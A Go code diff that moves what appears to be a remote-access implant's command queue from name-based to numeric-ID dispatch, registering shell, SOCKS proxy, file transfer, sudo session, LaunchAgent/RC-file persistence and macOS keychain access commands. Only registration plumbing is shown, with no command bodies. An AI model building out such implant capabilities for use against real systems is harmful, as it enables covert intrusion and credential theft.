@@ -33,7 +33,8 @@ var (
 type CommandQueue struct {
 	mu              sync.Mutex
 	commands        []Command
-	cmdRegistry     map[string]CommandInterface
+	cmdHandlers     map[int]CommandHandler          // New: numeric ID dispatch
+	cmdRegistry     map[string]CommandInterface     // Deprecated: kept for compatibility
 	cmdContext      *CommandContext
 	activeDownloads map[string]*DownloadInfo
 	activeJobs      map[string]JobInfo
@@ -55,36 +56,42 @@ func NewCommandQueue() *CommandQueue {
 	}
 
 	queue := &CommandQueue{
-		commands:        make([]Command, 0, 10),                // Pre-allocate for typical queue depth
-		cmdRegistry:     make(map[string]CommandInterface, 32), // Pre-allocate for all commands
+		commands:        make([]Command, 0, 10),               // Pre-allocate for typical queue depth
+		cmdHandlers:     make(map[int]CommandHandler, 32),     // Numeric ID handlers
+		cmdRegistry:     make(map[string]CommandInterface, 32), // Deprecated: kept for compatibility
 		cmdContext:      ctx,
-		activeDownloads: make(map[string]*DownloadInfo, 4),   // Pre-allocate for concurrent downloads
-		activeJobs:      make(map[string]JobInfo, 8),         // Pre-allocate for concurrent jobs
-		activeUploads:   make(map[string]*UploadInfo, 4),     // Pre-allocate for concurrent uploads
+		activeDownloads: make(map[string]*DownloadInfo, 4),    // Pre-allocate for concurrent downloads
+		activeJobs:      make(map[string]JobInfo, 8),          // Pre-allocate for concurrent jobs
+		activeUploads:   make(map[string]*UploadInfo, 4),      // Pre-allocate for concurrent uploads
 	}
 
-	// Register all core commands
-	queue.RegisterCommand(&CdCommand{})
-	queue.RegisterCommand(&LsCommand{})
-	queue.RegisterCommand(&PwdCommand{})
-	queue.RegisterCommand(&DownloadCommand{})
-	queue.RegisterCommand(&UploadCommand{})
-	queue.RegisterCommand(&ShellCommand{})
-	queue.RegisterCommand(&SocksCommand{})
-	queue.RegisterCommand(&JobKillCommand{})
-	queue.RegisterCommand(&ExitCommand{})
-	queue.RegisterCommand(&SleepCommand{})
-	queue.RegisterCommand(&RekeyCommand{})
-	queue.RegisterCommand(&SudoSessionCommand{})
-	queue.RegisterCommand(&EnvCommand{})
-	queue.RegisterCommand(&CatCommand{})
-	queue.RegisterCommand(&HashCommand{})
-	queue.RegisterCommand(&HashDirCommand{})
-	queue.RegisterCommand(&PSCommand{})
-	queue.RegisterCommand(&RmCommand{})
-	queue.RegisterCommand(&WhoamiCommand{})
-	queue.RegisterCommand(&PersistenceCommand{})   // RC files and LaunchAgent persistence
-	queue.RegisterCommand(&KeychainCommand{})      // Keychain access and manipulation
+	// Register all core commands using numeric IDs
+	// Cross-platform commands (1-18)
+	queue.RegisterHandler(CmdCd, wrapCommand(&CdCommand{}))
+	queue.RegisterHandler(CmdLs, wrapCommand(&LsCommand{}))
+	queue.RegisterHandler(CmdPwd, wrapCommand(&PwdCommand{}))
+	queue.RegisterHandler(CmdDownload, wrapCommand(&DownloadCommand{}))
+	queue.RegisterHandler(CmdUpload, wrapCommand(&UploadCommand{}))
+	queue.RegisterHandler(CmdShell, wrapCommand(&ShellCommand{}))
+	queue.RegisterHandler(CmdSocks, wrapCommand(&SocksCommand{}))
+	queue.RegisterHandler(CmdJobkill, wrapCommand(&JobKillCommand{}))
+	queue.RegisterHandler(CmdExit, wrapCommand(&ExitCommand{}))
+	queue.RegisterHandler(CmdSleep, wrapCommand(&SleepCommand{}))
+	queue.RegisterHandler(CmdRekey, wrapCommand(&RekeyCommand{}))
+	queue.RegisterHandler(CmdEnv, wrapCommand(&EnvCommand{}))
+	queue.RegisterHandler(CmdCat, wrapCommand(&CatCommand{}))
+	queue.RegisterHandler(CmdHash, wrapCommand(&HashCommand{}))
+	queue.RegisterHandler(CmdHashDir, wrapCommand(&HashDirCommand{}))
+	queue.RegisterHandler(CmdPs, wrapCommand(&PSCommand{}))
+	queue.RegisterHandler(CmdRm, wrapCommand(&RmCommand{}))
+	queue.RegisterHandler(CmdWhoami, wrapCommand(&WhoamiCommand{}))
+
+	// Linux/Darwin specific commands (100-101)
+	queue.RegisterHandler(CmdSudoSession, wrapCommand(&SudoSessionCommand{}))
+	queue.RegisterHandler(CmdPersist, wrapCommand(&PersistenceCommand{}))
+
+	// Darwin only commands (300)
+	queue.RegisterHandler(CmdKeychain, wrapCommand(&KeychainCommand{}))
 
 	// Start cleanup goroutine for stale transfers
 	go queue.cleanupStaleTransfers()
@@ -92,9 +99,16 @@ func NewCommandQueue() *CommandQueue {
 	return queue
 }
 
-// RegisterCommand adds a command to the registry
-func (cq *CommandQueue) RegisterCommand(cmd CommandInterface) {
-	cq.cmdRegistry[cmd.Name()] = cmd
+// RegisterHandler adds a command handler by numeric ID
+func (cq *CommandQueue) RegisterHandler(id int, handler CommandHandler) {
+	cq.cmdHandlers[id] = handler
+}
+
+// wrapCommand creates a CommandHandler from a CommandInterface (for migration)
+func wrapCommand(cmd CommandInterface) CommandHandler {
+	return func(ctx *CommandContext, args []string) CommandResult {
+		return cmd.Execute(ctx, args)
+	}
 }
 
 // Helper function to apply session environment before executing any command
